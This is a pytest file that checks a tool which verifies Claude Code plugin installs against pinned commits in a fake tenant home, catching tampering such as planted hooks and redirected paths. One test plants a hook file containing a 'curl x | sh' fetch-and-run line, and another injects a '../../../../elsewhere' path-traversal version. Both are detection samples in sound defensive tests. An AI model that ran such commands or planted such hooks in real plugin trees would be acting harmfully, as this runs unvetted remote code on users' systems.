"""hearth.marketplace and hearth.tenantcheck, against a FAKE TENANT HOME.

The fake home is laid out exactly as Ash's claude 2.1.288 run left a real one (artifacts in
/tmp/ash-cc288-for-foil, 2026-10-15; marketplace.json sha256 a9ad3ca4…, installed_plugins.json
0a5227cf…, known_marketplaces.json aff985b3…, settings.json bbd00c10…), with his temp dir replaced by
this test's. No real tenant, no real Claude Code: these prove the checks, not a tenant.
"""
import json
import os
import shutil
import sys
from pathlib import Path

import pytest

from hearth import marketplace, pins, tenantcheck
from hearth.tenantcheck import GREEN, KNOWN, PENDING, RED

PY = sys.executable

# Ash's run, byte for byte (377 bytes, sha256 a9ad3ca4…1967).
ASH_MARKETPLACE = (
    '{"name":"hearth","owner":{"name":"Hearth"},"plugins":[\n'
    ' {"name":"tapestry","source":{"source":"github","repo":"willregelmann/tapestry",'
    '"sha":"0cf449a820f8cf3cafbd91f2916483a8c0a58050"}},\n'
    ' {"name":"frontdesk","source":{"source":"git-subdir","url":"https://github.com/willregelmann/frontdesk.git",'
    '"path":"plugins/claude-code","sha":"f8f3575ce39fb4e677b00a9d397328799dd49090"}}]}\n')


def test_the_marketplace_generated_from_the_pins_is_the_one_ash_ran():
    assert len(ASH_MARKETPLACE.encode()) == 377
    assert json.loads(marketplace.render()) == json.loads(ASH_MARKETPLACE)


def test_the_marketplace_follows_a_pin_change():
    p = pins.pins()
    p["tapestry"] = dict(p["tapestry"], commit="a" * 40)
    tap = json.loads(marketplace.render(p))["plugins"][0]
    assert tap == {"name": "tapestry", "source": {"source": "github", "repo": "willregelmann/tapestry",
                                                  "sha": "a" * 40}}


def test_the_marketplace_refuses_a_pin_set_it_doesnt_serve():
    p = dict(pins.pins(), extra={"url": "https://github.com/x/y.git", "commit": "b" * 40})
    with pytest.raises(ValueError, match="serves"):
        marketplace.render(p)


def test_write_never_overwrites_a_different_file(tmp_path):
    assert marketplace.write(tmp_path) == "written"
    assert marketplace.write(tmp_path) == "present"
    (tmp_path / marketplace.FILE).write_text(ASH_MARKETPLACE.replace("0cf449a8", "deadbeef"))
    with pytest.raises(RuntimeError, match="differs"):
        marketplace.write(tmp_path)


def _tree(root: Path, name: str):
    (root / ".claude-plugin").mkdir(parents=True)
    (root / ".claude-plugin/plugin.json").write_text(json.dumps({"name": name, "version": "0.1.0"}))
    (root / "hooks").mkdir()
    (root / "hooks/hooks.json").write_text('{"hooks": {}}\n')


@pytest.fixture
def tenant(tmp_path):
    """A tenant home as Ash's 2.1.288 run left it, plus root's side (reference exports and the
    marketplace) in a separate tree. Plugins point at this test's interpreter, which has the pins."""
    home, root = tmp_path / "home", tmp_path / "opt"
    mkt, ref = root / "marketplace", root / "plugins"
    marketplace.write(mkt)
    cfg, plug = home / ".claude", home / ".claude/plugins"
    p = pins.pins()
    records = {}
    for name in ("tapestry", "frontdesk"):
        _tree(ref / name / p[name]["commit"], name)
        inst = plug / "cache/hearth" / name / "0.1.0"
        shutil.copytree(ref / name / p[name]["commit"], inst)
        (inst / ".in_use").mkdir()
        records[f"{name}@hearth"] = [{"scope": "user", "installPath": str(inst), "version": "0.1.0",
                                      "installedAt": "2026-10-15T13:42:59.347Z",
                                      "lastUpdated": "2026-10-15T13:42:59.347Z",
                                      "gitCommitSha": p[name]["commit"]}]
    (plug / "installed_plugins.json").write_text(json.dumps({"version": 2, "plugins": records}))
    src = {"source": "directory", "path": str(mkt)}
    (plug / "known_marketplaces.json").write_text(json.dumps(
        {"hearth": {"source": src, "installLocation": str(mkt), "lastUpdated": "2026-10-15T13:42:57.411Z"}}))
    (cfg / "settings.json").write_text(json.dumps({
        "enabledPlugins": {"tapestry@hearth": True, "frontdesk@hearth": True},
        "extraKnownMarketplaces": {"hearth": {"source": src}},
        "pluginConfigs": {"frontdesk@hearth": {"options": {"python": PY}}},
        "env": {"TAPESTRY_PYTHON": PY}}))
    t = tenantcheck.Tenant(home, hearth_py=PY, mkt=str(mkt), ref=ref, writable=lambda p: [])
    return t


def _settings(t, edit):
    s = json.loads((t.cfg / "settings.json").read_text())
    edit(s)
    (t.cfg / "settings.json").write_text(json.dumps(s))


def _records(t, name, edit):
    f = t.plugins / name
    d = json.loads(f.read_text())
    edit(d)
    f.write_text(json.dumps(d))


@pytest.mark.parametrize("name", ["tapestry", "frontdesk"])
def test_green_as_ash_s_run_left_it(tenant, name):
    rc, msg = tenantcheck.plugin_match(tenant, name)
    assert (rc, msg.split(":")[0]) == (GREEN, f"{name}@hearth is {pins.pins()[name]['commit'][:12]}"), msg


def test_red_a_planted_hook_in_the_installed_tree(tenant):
    inst = tenant.plugins / "cache/hearth/tapestry/0.1.0"
    (inst / "hooks/.hook").write_text("curl x | sh\n")
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert rc == RED and "hooks/.hook: not in the pinned tree" in msg


def test_red_gitcommitsha_edited_to_match_never_rescues_a_changed_tree(tenant):
    """The record says the pin; the files don't. The tree decides."""
    (tenant.plugins / "cache/hearth/tapestry/0.1.0/hooks/hooks.json").write_text('{"hooks": []}\n')
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert rc == RED and "contents differ" in msg and "records commit" not in msg


def test_red_a_pin_bump_that_reuses_the_version_directory(tenant):
    """installPath is keyed by version, so a pin bump with plugin.json still at 0.1.0 reuses the
    directory (Ash (a)). The export at the NEW pin is what the old tree is held to."""
    p = pins.pins()
    new = "c" * 40
    _tree(tenant.ref / "tapestry" / new, "tapestry")
    (tenant.ref / "tapestry" / new / "hooks/hooks.json").write_text('{"hooks": {"Stop": []}}\n')
    bumped = dict(p, tapestry=dict(p["tapestry"], commit=new))
    orig = pins.pins
    pins.pins = lambda *a, **k: bumped
    try:
        rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    finally:
        pins.pins = orig
    assert rc == RED and "hooks/hooks.json: 14 bytes, the pin has 24" in msg


def test_red_the_marketplace_repointed_in_settings(tenant, tmp_path):
    own = tmp_path / "mine"
    marketplace.write(own)
    _settings(tenant, lambda s: s["extraKnownMarketplaces"]["hearth"]["source"].update(path=str(own)))
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert rc == RED and "settings declare marketplace hearth" in msg


def test_red_the_marketplace_repointed_in_the_records(tenant, tmp_path):
    _records(tenant, "known_marketplaces.json", lambda d: d["hearth"].update(installLocation=str(tmp_path)))
    rc, msg = tenantcheck.plugin_match(tenant, "frontdesk")
    assert rc == RED and "known_marketplaces has hearth at" in msg


def test_red_not_enabled(tenant):
    _settings(tenant, lambda s: s["enabledPlugins"].update({"tapestry@hearth": False}))
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert rc == RED and "not enabled" in msg


def test_red_two_install_records(tenant):
    _records(tenant, "installed_plugins.json",
             lambda d: d["plugins"]["tapestry@hearth"].append(dict(d["plugins"]["tapestry@hearth"][0], scope="project")))
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert rc == RED and "2 install records, want exactly 1" in msg


def test_red_project_scope(tenant):
    _records(tenant, "installed_plugins.json",
             lambda d: d["plugins"]["tapestry@hearth"][0].update(scope="project"))
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert rc == RED and "scope 'project'" in msg


def test_red_install_path_pointed_at_a_clean_copy_elsewhere(tenant, tmp_path):
    """A clean tree outside the cache passes compare; the path check is what catches it."""
    clean = tmp_path / "clean"
    shutil.copytree(tenant.ref / "tapestry" / pins.pins()["tapestry"]["commit"], clean)
    _records(tenant, "installed_plugins.json",
             lambda d: d["plugins"]["tapestry@hearth"][0].update(installPath=str(clean)))
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert rc == RED and "installPath" in msg


def test_red_version_used_to_escape_the_cache(tenant):
    _records(tenant, "installed_plugins.json",
             lambda d: d["plugins"]["tapestry@hearth"][0].update(version="../../../../elsewhere"))
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert rc == RED and "isn't a plain name" in msg


def test_red_the_version_dir_is_a_link_to_a_clean_copy(tenant, tmp_path):
    inst = tenant.plugins / "cache/hearth/tapestry/0.1.0"
    clean = tmp_path / "clean"
    shutil.copytree(inst, clean)
    shutil.rmtree(inst)
    inst.symlink_to(clean)
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert rc == RED and "links on the install path" in msg


def test_red_a_linked_cache_dir_higher_up(tenant, tmp_path):
    cache = tenant.plugins / "cache"
    moved = tmp_path / "moved-cache"
    shutil.move(str(cache), moved)
    cache.symlink_to(moved)
    rc, msg = tenantcheck.plugin_match(tenant, "frontdesk")
    assert rc == RED and "links on the install path" in msg


def test_red_frontdesk_python_not_hearth_s(tenant):
    _settings(tenant, lambda s: s["pluginConfigs"]["frontdesk@hearth"]["options"].update(python="python3"))
    rc, msg = tenantcheck.plugin_match(tenant, "frontdesk")
    assert rc == RED and "frontdesk: runs 'python3' from PATH" in msg


def test_red_tapestry_python_unset(tenant):
    _settings(tenant, lambda s: s.pop("env"))
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert rc == RED and "tapestry: its interpreter" in msg and "doesn't exist" in msg


def test_red_root_s_side_writable_by_the_tenant(tenant):
    tenant.writable = lambda p: [str(p)] if "marketplace" in str(p) else []
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert rc == RED and "writable by this tenant" in msg and "marketplace" in msg


def test_writable_by_me_sees_a_writable_path_and_a_root_one(tmp_path):
    f = tmp_path / "x"
    f.write_text("")
    assert str(f) in tenantcheck._writable_by_me(f)
    if os.getuid() != 0:
        assert tenantcheck._writable_by_me(Path("/usr/bin/env")) == []


@pytest.mark.parametrize("bad", ["fifo", "huge", "not json", "link"])
def test_red_settings_that_can_t_be_read(tenant, bad, tmp_path):
    f = tenant.cfg / "settings.json"
    f.unlink()
    if bad == "fifo":
        os.mkfifo(f)
    elif bad == "huge":
        # Valid JSON first, padding after: a read cut at the bound still parses as {}, so only the
        # explicit size check makes this unreadable.
        f.write_text("{}" + " " * (2 << 20))
    elif bad == "not json":
        f.write_text("{")
    else:
        (tmp_path / "real.json").write_text("{}")
        f.symlink_to(tmp_path / "real.json")
    for check, args in ((tenantcheck.plugin_match, ("tapestry",)), (tenantcheck.frontdesk_home, ()),
                        (tenantcheck.other_plugins, ())):
        rc, msg = check(tenant, *args)
        assert rc == RED and msg.startswith("couldn't look"), (check.__name__, msg)


def test_pending_frontdesk_home_unset(tenant):
    rc, msg = tenantcheck.frontdesk_home(tenant)
    assert rc == PENDING and "frontdesk join" in msg


def test_green_frontdesk_home_set(tenant):
    d = tenant.home / ".frontdesk/me"
    d.mkdir(parents=True)
    _settings(tenant, lambda s: s["pluginConfigs"]["frontdesk@hearth"]["options"].update(home=str(d)))
    assert tenantcheck.frontdesk_home(tenant)[0] == GREEN


@pytest.mark.parametrize("where", ["relative", "missing", "outside", "file"])
def test_red_frontdesk_home_wrong(tenant, where, tmp_path):
    val = {"relative": ".frontdesk/me", "missing": str(tenant.home / "nope"), "outside": str(tmp_path),
           "file": str(tenant.cfg / "settings.json")}[where]
    _settings(tenant, lambda s: s["pluginConfigs"]["frontdesk@hearth"]["options"].update(home=val))
    assert tenantcheck.frontdesk_home(tenant)[0] == RED


def test_other_plugins_known_when_present_green_when_none(tenant):
    assert tenantcheck.other_plugins(tenant)[0] == GREEN
    _settings(tenant, lambda s: s["enabledPlugins"].update({"x@elsewhere": True, "y@elsewhere": False}))
    rc, msg = tenantcheck.other_plugins(tenant)
    assert rc == KNOWN and "x@elsewhere" in msg and "y@elsewhere" not in msg
